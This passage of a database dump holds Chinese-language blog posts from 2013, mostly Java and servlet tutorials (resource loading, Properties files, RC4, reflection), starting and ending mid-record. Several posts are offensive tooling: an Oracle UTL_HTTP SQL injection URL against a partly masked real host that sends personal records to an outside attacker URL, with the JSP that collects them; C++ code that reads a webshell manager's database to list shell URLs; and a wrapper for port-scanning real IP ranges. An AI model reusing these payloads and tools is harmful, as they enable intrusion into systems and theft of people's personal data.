name);</p>\n<p>这里name是资源的类路径，它是相对与“/”根路径下的位置。getResource得到的是一个URL对象来定位资源，而getResourceAsStream取得该资源输入流的引用保证程序可以从正确的位置抽取数据。</p>\n<p>然而，程序中调用的通常并不是ClassLoader的这两个方法，而是Class的getResource和getResourceAsStream方法，因为Class对象可以从你的类得到（如YourClass.class或YourClass.getClass()），而ClassLoader则需要再调用一次YourClass.getClassLoader()方法，但根据JDK文档的说法，Class对象的这两个方法其实是“委托”（delegate）给装载它的ClassLoader来做的，所以只需要使用Class对象的这两个方法就可以了。</p>\n<p>举例说明：</p>\n<p>mypackage.Hello.class.getResourceAsStream(\"/config/config.ini\");</p>\n<p>从classpath下的config相对路径中读取config.ini</p>\n<p>src(源文件夹)</p>\n<p>┃</p>\n<p>┣━11.properties</p>\n<p>┃</p>\n<p>┗━myspider（myspider包）</p>\n<p>┃</p>\n<p>┣━22.properties</p>\n<p>┗━Test.java</p>\n<pre class=\"brush: java; gutter: true\">package myspider;\nimport java.io.UnsupportedEncodingException;\n/**\n *\n * @author mark\n */\npublic class Test {\n    public static void main(String[] args) throws UnsupportedEncodingException{\n        Test t=new Test();\n        //文件名前不加“/”，则表示从当前类所在的包下查找该资源。如下则表示的是从包myspider下查找22.properties文件资源。\n        System.out.println(&quot;1：&quot;+t.getClass().getResourceAsStream(&quot;22.properties&quot;));//输出java.io.BufferedInputStream@61de33\n        //文件名前加了“/”，则表示从类路径下也就是从classes文件夹下查找资源，如下表示从classes文件夹下查找22.properties文件资源。\n        System.out.println(&quot;2：&quot;+t.getClass().getResourceAsStream(&quot;/22.properties&quot;));//输出null\n        //文件名前加了“/”，则表示从类路径下也就是从classes文件夹下查找资源，如下表示从classes文件夹下查找11.properties文件资源。\n        System.out.println(&quot;3：&quot;+t.getClass().getResourceAsStream(&quot;/11.properties&quot;));//输出java.io.BufferedInputStream@14318bb\n        System.out.println();\n        //当前包路径4：file:/E:/myobject/myspider/build/classes/myspider/\n        System.out.println(&quot;4：&quot;+t.getClass().getResource(&quot;&quot;));\n        //输出当前类路径5：file:/E:/myobject/myspider/build/classes/\n        System.out.println(&quot;5：&quot;+t.getClass().getResource(&quot;/&quot;));\n        /*\n         * 如果类路径下的当前包有22.properties文件，则输出6：file:/E:/myobject/myspider/build/classes/myspider/22.properties\n         * 否者输出源文件下的22.properties文件的路径，则输出：6：file:/E:/myobject/myspider/src/myspider/22.properties\n         */\n        System.out.println(&quot;6：&quot;+t.getClass().getResource(&quot;22.properties&quot;));\n        /*\n         * 如果类路径下有11.properties文件，则输出7：file:/E:/myobject/myspider/build/classes/11.properties\n         * 否者输出源文件下的11.properties文件的路径，则输出：6：7：file:/E:/myobject/myspider/src/11.properties\n         */\n        System.out.println(&quot;7：&quot;+t.getClass().getResource(&quot;/11.properties&quot;));\n    }\n}</pre>\n<p><strong>使用JavaSEAPI读取Properties文件的六种方法</strong></p>\n<p><strong>1。使用java.util.Properties类的load()方法</strong></p>\n<pre class=\"brush: java; gutter: true\">InputStream in= new BufferedInputStream(new FileInputStream(name));\nProperties p= new Properties();\np.load(in);</pre>\n<p><strong>2。使用java.util.ResourceBundle类的getBundle()方法</strong></p>\n<pre class=\"brush: java; gutter: true\">ResourceBundle rb = ResourceBundle.getBundle(name,Locale.getDefault());</pre>\n<strong>3。使用java.util.PropertyResourceBundle类的构造函数</strong>\n<pre class=\"brush: java; gutter: true\">InputStream in = new BufferedInputStream(new FileInputStream(name));\nResourceBundle rb = new PropertyResourceBundle(in);</pre>\n<p><strong>4。使用class变量的getResourceAsStream()方法</strong></p>\n<pre class=\"brush: java; gutter: true\">InputStream in = JProperties.class.getResourceAsStream(name);\nProperties p = new Properties();\np.load(in);</pre>\n<p><strong>5。使用class.getClassLoader()所得到的java.lang.ClassLoader的getResourceAsStream()方法</strong></p>\n<pre class=\"brush: java; gutter: true\">InputStream in = JProperties.class.getClassLoader().getResourceAsStream(name);\nProperties p = new Properties();\np.load(in);</pre>\n<p><strong>6。使用java.lang.ClassLoader类的getSystemResourceAsStream()静态方法</strong></p>\n<pre class=\"brush: java; gutter: true\">InputStream in = ClassLoader.getSystemResourceAsStream(name);\nProperties p = new Properties();\np.load(in);</pre>\n<p>补充</p>\n<p>Servlet中可以使用javax.servlet.ServletContext的getResourceAsStream()方法</p>\n<pre class=\"brush: java; gutter: true\">InputStream in = context.getResourceAsStream(path);\nProperties p = new Properties();\np.load(in);</pre>', null, '2013-11-28 16:00:41', '1', '517', null, '0', '2014-03-24 11:31:56'), ('14', '1', '3', 'Java获取系统属性、环境变量和反射获取当前请求内容', '园长', '<p>\n<p>	获取环境变量：</p></p>\n<br />\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nSystem.getenv()\n</pre>\n<br />\n<p>获取系统属性：<br /></p>\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nSystem.getProperties()\n</pre>\n<br />\n<p>反射调用ServletRequest和HttpServletRequest的get方法获取请求数据：<br /></p>\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nServletRequest sr= (ServletRequest)request;\nMethod[] cm = request.getClass().getDeclaredMethods();\nMethod[] rm = sr.getClass().getDeclaredMethods();\n</pre>\n<p><p></p>\n<p>	Invoke的时候应该用当前的request而不是newInstance()：</p></p>\n<br />\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nm.invoke(request, new Object[]{})</pre>\n<p><p></p>\n	<br />\n<p>	代码:</p></p>\n<br />\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n/**\n	 * Server info\n	 * @param request\n	 * @return\n	 */\n	public Map&lt;String,Object&gt; getServerInfo(HttpServletRequest request){\n		Map&lt;String,Object&gt; map = new HashMap&lt;String, Object&gt;(),\n							sp = new HashMap&lt;String, Object&gt;(),\n							req = new HashMap&lt;String, Object&gt;();\n		map.put(&quot;env&quot;, System.getenv());\n		for(Object s:System.getProperties().keySet()){\n			sp.put((String) s, System.getProperty((String)s));\n		}\n		map.put(&quot;property&quot;, sp);\n		try {\n			ServletRequest sr= (ServletRequest)request;\n			Method[] cm = request.getClass().getDeclaredMethods();\n			Method[] rm = sr.getClass().getDeclaredMethods();\n			for(Method m:cm){\n				m.setAccessible(true);\n				if(m.getName().startsWith(&quot;get&quot;)&amp;&amp;!Pattern.compile(&quot;getInputStream|getReader&quot;).matcher(m.getName()).find()&amp;&amp;\n						m.getName().indexOf(&quot;&quot;)==-1&amp;&amp;m.getParameterTypes().length==0){\n					req.put(m.getName(),&quot;&quot;+m.invoke(request, new Object[]{}));\n				}\n			}\n			for(Method m:rm){\n				m.setAccessible(true);\n				if(m.getName().startsWith(&quot;get&quot;)&amp;&amp;!Pattern.compile(&quot;getInputStream|getReader&quot;).matcher(m.getName()).find()&amp;&amp;\n						m.getParameterTypes().length==0){\n					req.put(m.getName(),&quot;&quot;+m.invoke(request, new Object[]{}));\n				}\n			}\n		}catch (IllegalArgumentException e) {\n			e.printStackTrace();\n		} catch (IllegalAccessException e) {\n			e.printStackTrace();\n		} catch (InvocationTargetException e) {\n			e.printStackTrace();\n		}\n		return map;\n	}\n</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><p></p>\n<p>	&nbsp;</p></p>\n<p><p></p>\n<p>	&nbsp;</p></p>', null, '2013-11-28 16:00:19', '1', '570', null, '2', '2013-11-28 15:57:31'), ('18', '1', '3', 'Java Servlet3.0动态注册Filter', '园长', '<p>\n<p>	Servlet3.0 API允许用户在代码里面动态注册Servlet和Filter，Tomcat7默认支持3.0。</p></p>\n<p><p></p>\n<p>	配置：</p></p>\n<pre class=\"brush:xml;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n&lt;listener&gt;\n&lt;listener-class&gt;org.javaweb.filter.TestListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n</pre>\n<p><p></p>\n<p>	TestListener内容：</p></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\npackage org.javaweb.filter;\nimport java.util.EnumSet;\nimport java.util.logging.Logger;\nimport javax.servlet.DispatcherType;\nimport javax.servlet.FilterRegistration;\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletContextEvent;\nimport javax.servlet.ServletContextListener;\npublic class TestListener implements ServletContextListener{\n	private Logger logger = Logger.getLogger(&quot;javaweb&quot;);\n	public void contextDestroyed(ServletContextEvent arg0) {\n		logger.info(&quot;Context Destroyed......&quot;);\n	}\n	public void contextInitialized(ServletContextEvent sce) {\n		ServletContext sc = sce.getServletContext();\n		FilterRegistration.Dynamic filter = sc.addFilter(&quot;TestFilter&quot;,&quot;org.javaweb.test.filter.TestFilter&quot;);\n		EnumSet&lt;DispatcherType&gt; disps = EnumSet.of(DispatcherType.REQUEST,DispatcherType.FORWARD);\n		filter.addMappingForUrlPatterns(disps, true, &quot;/*&quot;);\n	}\n}\n</pre>', null, '2013-11-28 16:01:25', '1', '536', null, '0', '2013-11-28 16:10:31'), ('43', '1', '3', 'XXInputStream转ServletInputStream问题', '园长', 'ServletInputStream 是InputStream的子类，ServletInputStream和父类InputStream都是一个抽象方法。在请求当中：request.getInputStream();(request.getInputStream() 方法 源于ServletRequest。)获取到的是个ServletInputStream流对象，所以在处理完ServletInputStream之后需要把InputStram给转换成ServletInputStream对象。<br />\n<br />\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nprotected ServletInputStream() {\n        // NOOP\n}\npublic int readLine(byte[] b, int off, int len) throws IOException {\n	if (len &lt;= 0) {\n	    return 0;\n	}\n	int count = 0, c;\n	while ((c = read()) != -1) {\n	    b[off++] = (byte)c;\n	    count++;\n	    if (c == &#39;\\n&#39; || count == len) {\n		break;\n	    }\n	}\n	return count &gt; 0 ? count : -1;\n    }\n</pre>\n<br />\n<p>把流对象转换成ServletInputStream对象：<br /></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nfinal InputStream ins = xxxxx流;\n	if(ins==null){\n		return true;\n	}\n	this.inputStream = new ServletInputStream() {\n		public int read() throws IOException {\n			return ins.read();\n		}\n		public void close() throws IOException {\n			ins.close();\n		}\n	};\n</pre>', null, '2013-11-28 14:07:26', '1', '540', null, '0', '2013-11-28 14:21:04'), ('45', '1', '3', 'ServletRequest中的getInputStream流处理', '园长', '<dl>\n<p>	<dd></p>\n		<code>ServletInputStream getInputStream(),<font face=\"Simsun\">返回请求主题当中的二进制流</font>ServletInputStream对象，需要注意的是这个</code></dd>\n	ServletInputStream只能够读取一次，就会关闭了。如果在Filter里处理了这个ServletInputStream流，那么在应用层再次去取：request.getInputStream()拿到的必然是个空对象。<br />\n	&nbsp; &nbsp; 为了避免这样的问题可以想办法复制这个流并处理然后交给HttpServletRequestWrapper（请求包装类)的子类一个处理后的流对象这样在应用层去request.getInputStream()拿到的流肯定就是包装后的流对象了。\n</dl>\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**\n	 * clone a InputStream\n	 * @param inputStream\n	 * @return\n	 * @throws IOException \n	 */\n	public static InputStream validateInputStream(InputStream inputStream,Properties properties) throws IOException{\n		if(inputStream==null){\n			return null;\n		}\n		byte[] b = new byte[1024];\n		int n = 0;\n		ByteArrayOutputStream baos = new ByteArrayOutputStream();\n		ByteArrayOutputStream os = new ByteArrayOutputStream();\n		while((n=inputStream.read(b))!=-1){\n			baos.write(b,0,n);\n			os.write(b,0,n);\n		}\n		if(validateFormData(new ByteArrayInputStream(os.toByteArray()),properties)){\n			return null;\n		}\n		return new ByteArrayInputStream(baos.toByteArray());\n	}\n</pre>\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nprivate ServletInputStream servletInputStream;\n@Override\npublic ServletInputStream getInputStream() throws IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;return this.servletInputStream;\n}\n</pre>\n<p><dl></p>\n	<br />\n<p>	请求流复制：<br /></p>\n<p>	请求包装子类：</p>\n<p></dl></p>', null, '2013-11-28 14:19:47', '1', '568', null, '0', '2013-11-28 14:22:20'), ('49', '1', '19', 'Tomcat 版本带来的web.xml filter和servlert配置的变化', '园长', 'Tomcat7以下本可以在conf/web.xml配置一个全局的Servlet或Filter的，但是自从发布7.x以后官方把这当一个Bug修复了。（<a href=\"https://issues.apache.org/bugzilla/show_bug.cgi?id=51754\">https://issues.apache.org/bugzilla/show_bug.cgi?id=51754</a>）\n<p>也就是说Tomcat7以上不能再用如下配置去映射一个Filter了：</p>\n<pre class=\"brush:xml;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">&lt;filter&gt;\n    &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.javaweb.filter.TestFilter&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;</pre>\n<p>但是由于Tomcat7默认就支持Servlet3.0 API，于是乎我是否想到了什么...用Servlet3.0 API动态去注册一个Filter或者Serlvet就行了：</p>\n<pre class=\"brush:xml;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">&lt;listener&gt;\n&lt;listener-class&gt;org.javaweb.filter.TestListener&lt;/listener-class&gt;\n&lt;/listener&gt;</pre>\n<p><span style=\"color: #2f2f2f; font-family: \'Open Sans\', sans-serif; font-size: 14px; line-height: 21px; background-color: #ffffff;\">TestListener内容：</span></p>\n<p>http://javaweb.org/?p=18</p>', null, '2013-11-28 16:01:17', '1', '750', null, '0', '2013-12-05 22:06:30'), ('58', '1', '3', 'Java RC4加密解密工具类', '园长', '注意参数类型和返回类型（String和byte数组）问题。<br />\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\npackage orf.javaweb.util;\nimport java.io.IOException;\nimport sun.misc.BASE64Decoder;\npublic class RC4 {\n	public static String decryption_RC4(byte[] data, String key) {\n		if (data == null || key == null) {\n			return null;\n		}\n		return asString(RC4Base(data, key));\n	}\n	public static String decryption_RC4(String data, String key) {\n		if (data == null || key == null) {\n			return null;\n		}\n		return new String(RC4Base(HexString2Bytes(data), key));\n	}\n	public static byte[] encryption_RC4_byte(String data, String key) {\n		if (data == null || key == null) {\n			return null;\n		}\n		byte b_data[] = data.getBytes();\n		return RC4Base(b_data, key);\n	}\n	public static String encryption_RC4_string(String data, String key) {\n		if (data == null || key == null) {\n			return null;\n		}\n		return toHexString(asString(encryption_RC4_byte(data, key)));\n	}\n	private static String asString(byte[] buf) {\n		StringBuffer strbuf = new StringBuffer(buf.length);\n		for (int i = 0; i &lt; buf.length; i++) {\n			strbuf.append((char) buf[i]);\n		}\n		return strbuf.toString();\n	}\n	private static byte[] initKey(String aKey) {\n		byte[] b_key = aKey.getBytes();\n		byte state[] = new byte[256];\n		for (int i = 0; i &lt; 256; i++) {\n			state[i] = (byte) i;\n		}\n		int index1 = 0;\n		int index2 = 0;\n		if (b_key == null || b_key.length == 0) {\n			return null;\n		}\n		for (int i = 0; i &lt; 256; i++) {\n			index2 = ((b_key[index1] &amp; 0xff) + (state[i] &amp; 0xff) + index2) &amp; 0xff;\n			byte tmp = state[i];\n			state[i] = state[index2];\n			state[index2] = tmp;\n			index1 = (index1 + 1) % b_key.length;\n		}\n		return state;\n	}\n	private static String toHexString(String s) {\n		String str = &quot;&quot;;\n		for (int i = 0; i &lt; s.length(); i++) {\n			int ch = (int) s.charAt(i);\n			String s4 = Integer.toHexString(ch &amp; 0xFF);\n			if (s4.length() == 1) {\n				s4 = &#39;0&#39; + s4;\n			}\n			str = str + s4;\n		}\n		return str;// 0x表示十六进制\n	}\n	private static byte[] HexString2Bytes(String src) {\n		int size = src.length();\n		byte[] ret = new byte[size / 2];\n		byte[] tmp = src.getBytes();\n		for (int i = 0; i &lt; size / 2; i++) {\n			ret[i] = uniteBytes(tmp[i * 2], tmp[i * 2 + 1]);\n		}\n		return ret;\n	}\n	private static byte uniteBytes(byte src0, byte src1) {\n		char _b0 = (char) Byte.decode(&quot;0x&quot; + new String(new byte[] { src0 })).byteValue();\n		_b0 = (char) (_b0 &lt;&lt; 4);\n		char _b1 = (char) Byte.decode(&quot;0x&quot; + new String(new byte[] { src1 })).byteValue();\n		byte ret = (byte) (_b0 ^ _b1);\n		return ret;\n	}\n	private static byte[] RC4Base(byte[] input, String mKkey) {\n		int x = 0;\n		int y = 0;\n		byte key[] = initKey(mKkey);\n		int xorIndex;\n		byte[] result = new byte[input.length];\n		for (int i = 0; i &lt; input.length; i++) {\n			x = (x + 1) &amp; 0xff;\n			y = ((key[x] &amp; 0xff) + y) &amp; 0xff;\n			byte tmp = key[x];\n			key[x] = key[y];\n			key[y] = tmp;\n			xorIndex = ((key[x] &amp; 0xff) + (key[y] &amp; 0xff)) &amp; 0xff;\n			result[i] = (byte) (input[i] ^ key[xorIndex]);\n		}\n		return result;\n	}\n}\n</pre>\n<br />\n<br />\n<br />', null, '2013-11-28 14:42:49', '1', '572', null, '0', '2013-11-28 14:42:49'), ('63', '1', '3', 'Java 调用外部s扫描并获取扫描结果', '园长', '这个实在太简单了，不过还是记录下来吧。java.lang.Runtime.getRuntime().exec(&quot;xxxxx&quot;);执行完之后其实返回的是一个流对象，那么也就是说调用一个外部的exe之类执行过程中的结果也可以在流中看到。调用后记得关闭后台的exe进程哦，偷懒就不写了。<br />\n<br />\n<p>简单实现代码：<br /></p>\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\npackage net.ltan.test;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class STest {\n	public static List&lt;String&gt; test(String type,String ip,int port,int th){\n		String cmd = &quot;c:/s.exe &quot;+type+&quot; &quot;+ip+&quot; &quot;+port+&quot; &quot;+th;\n		Pattern reg =Pattern.compile(&quot;(2[5][0-5]|2[0-4]\\\\d|1\\\\d{2}|\\\\d{1,2})\\\\.(25[0-5]|2[0-4]\\\\d|1\\\\d{2}|\\\\d{1,2})\\\\.(25[0-5]|2[0-4]\\\\d|1\\\\d{2}|\\\\d{1,2})\\\\.(25[0-5]|2[0-4]\\\\d|1\\\\d{2}|\\\\d{1,2})&quot;);\n		List&lt;String&gt; ls = new ArrayList&lt;String&gt;();\n		try {\n			Process p = java.lang.Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd);\n			BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream(),&quot;UTF-8&quot;));\n			String temp;\n			while ((temp = in.readLine()) != null) {\n				Matcher matcher = reg.matcher(temp);\n				if(matcher.find()){\n					ls.add(matcher.group());\n					System.out.println(temp);\n				}\n			}\n		} catch (IOException e) {\n			e.printStackTrace();\n		}\n		return ls;\n	}\n	public static void main(String[] args) {\n		List&lt;String&gt; ls = test(&quot;TCP&quot;,&quot;210.73.128.10 210.73.164.10&quot;,8080,512);\n		System.out.println(&quot;---------------------------------------------&quot;);\n		for(String s:ls){\n			System.out.println(s);\n		}\n	}\n}\n</pre>', null, '2013-11-28 14:53:12', '1', '520', null, '0', '2013-11-28 14:53:12'), ('67', '1', '16', 'Oracle JDBC获取DDL', '园长', '<p>\n<p>	在Oracle的console获取DDL语句：</p></p>\n<p><div></p>\n<p>	SET LONG 2000000</div></p>\n<p><div></p>\n<p>	SET PAGESIZE 0</div></p>\n<p><div></p>\n<p>	EXECUTE DBMS_METADATA.SET_TRANSFORM_PARAM(DBMS_METADATA.SESSION_TRANSFORM,&#39;STORAGE&#39;,false);</div></p>\n<p><p></p>\n<p>	select dbms_metadata.GET_DDL(u.object_type,u.object_name,&#39;SCOTT&#39;) from dba_objects u where owner = &#39;SCOTT&#39;;&nbsp;</p></p>\n<p><p></p>\n<p>	这查询一旦搬到JDBC就会出问题，原因是查询出来的是Clob而非String 所以需要把Clob转换成String。</p></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nString clobToString(Clob clob) {\n	try {\n		// 以 java.io.Reader 对象形式（或字符流形式）  \n		//检索此 Clob 对象指定的 CLOB 值 --Clob的转换  \n		Reader inStreamDoc = clob.getCharacterStream();\n		// 取得clob的长度  \n		char[] tempDoc = new char[(int) clob.length()];\n		inStreamDoc.read(tempDoc);\n		inStreamDoc.close();\n		return new String(tempDoc);\n	} catch (IOException e) {\n		e.printStackTrace();\n	} catch (SQLException es) {\n		es.printStackTrace();\n	}\n	return null;\n}\nString sqlSpecialChars(String str) {\n	str = str.replaceAll(&quot;&#39;&quot;, &quot;&#39;&#39;&quot;);\n	return str;\n}\n</pre>\n<p><p></p>\n<p>	&nbsp;</p></p>', null, '2013-11-28 14:58:24', '1', '766', null, '0', '2013-11-28 15:05:10'), ('70', '1', '10', 'C++ 连接mysql和连接菜刀access数据库查询', '园长', 'C++连接MysqlDemo：<br />\n<pre class=\"brush:cpp;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n#include &quot;StdAfx.h&quot;\n#include &quot;winsock.h&quot;\n#include &lt;iostream&gt;\n#include &quot;mysql.h&quot;\n#pragma comment(lib, &quot;ws2_32.lib&quot;)\n#pragma comment(lib, &quot;libmysql.lib&quot;)\nusing namespace std;\nvoid getConnecetion(){\n	MYSQL mydata;\n	mysql_library_init(0,NULL,NULL);//初始化MySQL C API库\n	mysql_init(&amp;mydata);//初始化mydata的数据结构，mydata是MYSQL对象\n	mysql_options(&amp;mydata,MYSQL_SET_CHARSET_NAME,&quot;gbk&quot;);//连接选项：添加GBK字符集支持\n	//连接函数\n	if(mysql_real_connect(&amp;mydata,&quot;localhost&quot;,&quot;root&quot;,&quot;caonimei&quot;,&quot;test&quot;,3306,0,0) != NULL){\n		cout&lt;&lt;&quot;database connection OK!&quot;&lt;&lt;endl;\n		system(&quot;pause&quot;);\n	}\n}\nvoid main()\n{\n	//getConnecetion();\n}\n</pre>\n<br />\n<p>C++连接菜刀数据库查询Demo：<br /></p>\n<pre class=\"brush:cpp;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\n#include &quot;stdafx.h&quot;\n#include&lt;iostream&gt;\nusing namespace std;\n#include &lt;stdio.h&gt;\n#import &quot;c:\\program files\\common files\\system\\ado\\msado15.dll&quot; no_namespace rename (&quot;EOF&quot;, &quot;adoEOF&quot;)\nint main(int argc, char *argv[]){\n  char sql[100];\n  char *pwd = &quot;\\x0A\\xC3\\xDC\\x0D\\x09\\x0A\\xC2\\xEB\\x02&quot;;\n  char *db = &quot;db.mdb&quot;;\n  if(argc == 2) {\n    db = argv[1];\n  }\n  sprintf(sql, &quot;Provider=Microsoft.Jet.OLEDB.4.0;Data Source=%s;Jet OLEDB:Database Password=%s&quot;, db, pwd);\n  _ConnectionPtr m_pConnection;\n  CoInitialize(NULL);\n    m_pConnection.CreateInstance(__uuidof(Connection));\n  try {\n    m_pConnection-&gt;Open(sql, &quot;&quot;, &quot;&quot;, adModeUnknown);\n  } catch (_com_error e) {\n    cout&lt;&lt;e.Description()&lt;&lt;endl;\n    return 0;\n  }\n  _RecordsetPtr m_pRecordset;\n  m_pRecordset.CreateInstance(__uuidof(Recordset));\n  /**\n  获取所有表名\n  m_pRecordset = m_pConnection-&gt;OpenSchema(adSchemaTables);             \n    while(!(m_pRecordset-&gt;adoEOF))                  \n  {\n    _bstr_t table_name = m_pRecordset-&gt;Fields-&gt;GetItem(&quot;TABLE_NAME&quot;)-&gt;Value; \n    _bstr_t table_type = m_pRecordset-&gt;Fields-&gt;GetItem(&quot;TABLE_TYPE&quot;)-&gt;Value;                               \n    cout&lt;&lt;table_name&lt;&lt;endl; \n    m_pRecordset-&gt;MoveNext();             \n  }\n  m_pRecordset-&gt;Close();\n  return 0;\n  *\n  **/\n  const _variant_t vtSql = &quot;SELECT * FROM SITE&quot;; //存放的表名为SITE\n  try{\n    m_pRecordset-&gt;Open(vtSql, m_pConnection.GetInterfacePtr(), adOpenDynamic, adLockOptimistic, adCmdText);\n  }\n  catch(_com_error e)\n  {\n    cout&lt;&lt;e.Description()&lt;&lt;endl;\n  }  \n  /**\n  获取字段名\n  Fields* fields=NULL;\n  m_pRecordset-&gt;get_Fields(&amp;fields);\n  long count = fields-&gt;Count;\n  BSTR *bstr = new BSTR[count];\n  for(long j=0; j&lt;count; j++)\n  {\n    fields-&gt;Item[j]-&gt;get_Name(&amp;bstr[j]);\n    char *name = _com_util::ConvertBSTRToString(bstr[j]);\n    cout&lt;&lt;name&lt;&lt;&quot;  &quot;;\n  }\n  *得到shell地址字段名为SiteUrl\n  **/\n    _variant_t var;\n    char *value;\n    try{\n    if(!m_pRecordset-&gt;BOF) {\n            m_pRecordset-&gt;MoveFirst(); \n    } else {\n            cout&lt;&lt;&quot;表内数据为空&quot;&lt;&lt;endl;\n            return 1;\n        }\n    while(!m_pRecordset-&gt;adoEOF) {\n        var = m_pRecordset-&gt;GetCollect(&quot;SiteUrl&quot;); \n        if(var.vt != VT_NULL) \n          value= _com_util::ConvertBSTRToString((_bstr_t)var);\n        cout&lt;&lt;value&lt;&lt;endl; \n        m_pRecordset-&gt;MoveNext(); \n        }\n  }\n    catch(_com_error e)\n    {\n    cout&lt;&lt;e.Description()&lt;&lt;endl;\n    }  \n  m_pRecordset-&gt;Close();\n    m_pRecordset = NULL;  \n    if(m_pConnection-&gt;State)\n    m_pConnection-&gt;Close();\n    m_pConnection= NULL;\n	system(&quot;pause&quot;);\n    return 0;\n}\n</pre>', null, '2013-11-28 15:01:03', '1', '529', null, '0', '2013-11-28 15:01:03'), ('72', '1', '16', 'Oracle UTL_HTTP 注入点友情备份数据库', '园长', '<span style=\"font-family: Tahoma, Helvetica, SimSun, sans-serif; color: #444444;\">很多人只听说过用UTL_HTTP注入Oracle，似乎没看见有人用UTL_HTTP脱裤？</span><br style=\"font-family: Tahoma, Helvetica, SimSun, sans-serif; color: #444444;\" />\n<p><span style=\"font-family: Tahoma, Helvetica, SimSun, sans-serif; color: #444444;\">UTL_HTTP 会查询数据库并带着查询的结果去请求我们的URL，也就是我注入点上写的URL。请注意：UTL_HTTP是一条一条的去请求的，所以会跟数据库保持一个长连接。而数据量过大的话会导致数据丢失，如果想完整的友情备份这种方法并不是特别可行。</span><br style=\"font-family: Tahoma, Helvetica, SimSun, sans-serif; color: #444444;\" /></p>\n<p><span style=\"font-family: Tahoma, Helvetica, SimSun, sans-serif; color: #444444;\">只有在浏览器上请求这个注入点</span><strong style=\"font-family: Tahoma, Helvetica, SimSun, sans-serif; color: #444444;\"><span style=\"color: red;\">Oracle会自动的把自己的裤子送上门</span></strong><span style=\"font-family: Tahoma, Helvetica, SimSun, sans-serif; color: #444444;\">来那种感觉非常的好。</span></p>\n<p>Oracle：</p>\n<pre class=\"brush:xhtml;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">http://60.xxx.xx.131/xxx/aao_66/index.jsp?fid=1+and+&#039;1&#039;in(SELECT+UTL_HTTP.request(&#039;http://xxx.cn:8080/xxxx/mysql.jsp?data=&#039;||ID||&#039;----&#039;||USERID||&#039;----&#039;||NAME||&#039;----&#039;||RELATION||&#039;----&#039;||OCCUPATION||&#039;----&#039;||POSITION||&#039;----&#039;||ASSN||UNIT||&#039;----&#039;||&#039;----&#039;||TEL)+FROM+STU_HOME)</pre>\n接收:\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;utf-8&quot;%&gt;\n&lt;%@page import=&quot;java.io.BufferedWriter&quot;%&gt;\n&lt;%@page import=&quot;java.io.FileWriter&quot;%&gt;\n&lt;%@page import=&quot;java.io.File&quot;%&gt;\n&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;My JSP &#039;mysql.jsp&#039; starting page&lt;/title&gt;\n        &lt;meta http-equiv=&quot;pragma&quot; content=&quot;no-cache&quot;&gt;\n        &lt;meta http-equiv=&quot;cache-control&quot; content=&quot;no-cache&quot;&gt;\n        &lt;meta http-equiv=&quot;expires&quot; content=&quot;0&quot;&gt;    \n        &lt;meta http-equiv=&quot;keywords&quot; content=&quot;keyword1,keyword2,keyword3&quot;&gt;\n        &lt;meta http-equiv=&quot;description&quot; content=&quot;This is my page&quot;&gt;\n  &lt;/head&gt;\n  &lt;body&gt;&amp;nbsp; \n        &lt;% \n                String data=new String(request.getParameter(&quot;data&quot;).getBytes(&quot;ISO-8859-1&quot;),&quot;utf-8&quot;); \n                BufferedWriter bw=new BufferedWriter(new FileWriter(new File(&quot;e:/req.txt&quot;),true));\n                //bw.write(&quot;Ip:&quot;+CheckSqlInjection.getIpAddr(request));\n                //bw.newLine();\n                System.out.println(&quot;Data:&quot;+data);\n                bw.write(data);\n                bw.newLine();\n                bw.flush();\n                bw.close();\n        %&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre>', null, '2013-11-28 15:03:55', '1', '742', null, '0', '2014-04-15 14:45:43'), ('76', '1', '3', 'Java实现C段域名IP采集', '园长', '只要再简简单单的封装一下就能够以在线的方式供别人查询了。\n<pre 